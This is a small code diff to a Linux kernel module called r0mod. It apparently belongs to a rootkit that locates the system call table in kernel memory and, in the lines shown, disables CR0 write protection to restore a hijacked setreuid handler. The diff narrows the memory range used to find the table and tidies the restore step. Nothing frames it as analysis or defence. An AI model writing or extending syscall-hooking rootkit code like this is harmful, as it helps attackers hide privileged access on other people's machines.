@@ -10,7 +10,7 @@
 #include <r0mod/global.h>
 
 #define SEARCH_START    PAGE_OFFSET
-#define SEARCH_END      0xffffffffffffffff
+#define SEARCH_END      PAGE_OFFSET + 0xffffff
 
 unsigned long *syscall_table;
 
@@ -81,7 +81,7 @@ static void __exit r0mod_exit(void)
     {
         write_cr0(read_cr0() & (~0x10000));
 
-        syscall_table[__NR_setreuid] = (void *)orig_setreuid;
+        syscall_table[__NR_setreuid] = orig_setreuid;
 
         write_cr0(read_cr0() | 0x10000);
     }
